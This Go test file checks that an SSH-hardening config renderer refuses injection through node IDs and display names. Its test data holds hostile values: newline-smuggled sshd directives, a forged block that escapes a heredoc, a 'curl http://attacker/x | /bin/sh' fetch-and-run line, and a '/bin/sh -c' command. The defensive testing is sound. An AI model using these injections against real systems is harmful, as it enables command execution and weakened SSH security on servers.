package sshguard

import (
	"strings"
	"testing"
)

// These are regression tests for two live injections, both found by probing the
// renderer rather than by reading it. The second was found by an independent
// review pass and is the more severe of the two: it escapes the heredoc and
// reaches command execution on the node.
//
// The shape survives any rewrite of this package, which is why the tests are
// written against the outcome rather than against the current defenses: any
// value interpolated into a rendered document is a way to add a line to it, and
// a line in these documents is a directive, a firewall rule, or a shell command.

// Original finding: node_id is interpolated into a comment in both the sshd
// drop-in and the nftables ruleset, so "x\nPermitRootLogin yes" rendered a live
// sshd directive under a comment that looked ordinary.
func TestNodeIDCannotAddLinesToRenderedConfigs(t *testing.T) {
	for _, evil := range []string{
		"x\nPermitRootLogin yes",
		"x\n}\ntable inet attacker {",
		"x\rPort 2222",
	} {
		p := hkProfile()
		p.NodeID = evil
		if _, err := p.RenderSSHDDropIn(); err == nil {
			t.Fatalf("node_id %q must be refused", evil)
		}
		if _, err := p.RenderKnockRuleset(); err == nil {
			t.Fatalf("node_id %q must be refused", evil)
		}
	}
}

// Review finding, and the worst of the set. A node_id carrying a whole fenced
// block adds an artifact the profile never had. Because the injected block's
// first line is the heredoc delimiter the apply script uses, the `cat > file`
// that writes it terminates early and everything after it is executed by the
// shell instead of being written to a config file. That is command execution on
// the node, reached through a field that used to be checked only for emptiness.
func TestNodeIDCannotForgeAnArtifactBlockOrEscapeTheHeredoc(t *testing.T) {
	evil := "n1\n```\n\n```knockd\nLATTICE_SSHGUARD_KNOCKD\n/usr/bin/curl -s http://attacker/x | /bin/sh\n```\n"
	p := Profile{
		NodeID: evil, KeepLegacyPort: true, Hardening: DefaultHardening(),
		MgmtSources: []string{"10.0.0.0/24"}, ConfirmWindowSec: 900,
	}
	if _, err := RenderArmPlan(p, ""); err == nil {
		t.Fatal("a node_id carrying a fenced block must be refused before it reaches a plan")
	}
}

// The same escape attempted through a node's display name, which arrives from
// another subsystem and needs only node:admin to set.
func TestDisplayNameCannotForgeAnArtifactBlock(t *testing.T) {
	name := "gomami\nssh_port: 0\ngated_ports: 22\n\n```knockd\nLATTICE_SSHGUARD_KNOCKD\n/bin/sh -c 'id > /tmp/pwned'\n```\n"
	p := hkProfile()
	p.Knock = nil
	p.SSHPort = 0
	plan, err := RenderArmPlan(p, name)
	if err != nil {
		t.Fatalf("a sanitized name must still produce a plan: %v", err)
	}
	art, err := ParseApprovalPlan(plan)
	if err != nil {
		t.Fatalf("plan must remain parseable: %v", err)
	}
	if art.KnockdConf != "" {
		t.Fatal("a profile with no knock policy must not acquire a knockd artifact from a display name")
	}
	script, err := ApplyScriptFromPlan(plan)
	if err != nil {
		t.Fatal(err)
	}
	for _, forbidden := range []string{"/tmp/pwned", "curl", "attacker"} {
		if strings.Contains(script, forbidden) {
			t.Fatalf("injected content %q reached the apply script", forbidden)
		}
	}
	if strings.Count(script, "LATTICE_SSHGUARD_KNOCKD") != 0 {
		t.Fatal("a heredoc delimiter for an artifact this profile does not have must not appear at all")
	}
}

// A fence marker is only structure at the start of a line. Without this,
// sanitizing a value to a single line is not enough: the same characters
// appearing mid-line would still be read as a block.
func TestFencesAreOnlyRecognizedAtTheStartOfALine(t *testing.T) {
	p := hkProfile()
	plan, err := RenderArmPlan(p, "")
	if err != nil {
		t.Fatal(err)
	}
	inline := strings.Replace(plan, "stage: arm", "stage: arm\nnote: see ```sshd Port 2222 ``` above", 1)
	art, err := ParseApprovalPlan(inline)
	if err != nil {
		t.Fatalf("mid-line backticks are text, not structure: %v", err)
	}
	if !strings.Contains(art.SSHDDropIn, "Port 58394") {
		t.Fatal("the real sshd artifact must still be the one that parses out")
	}
	if strings.Contains(art.SSHDDropIn, "Port 2222") {
		t.Fatal("mid-line content was read as a fence")
	}
}
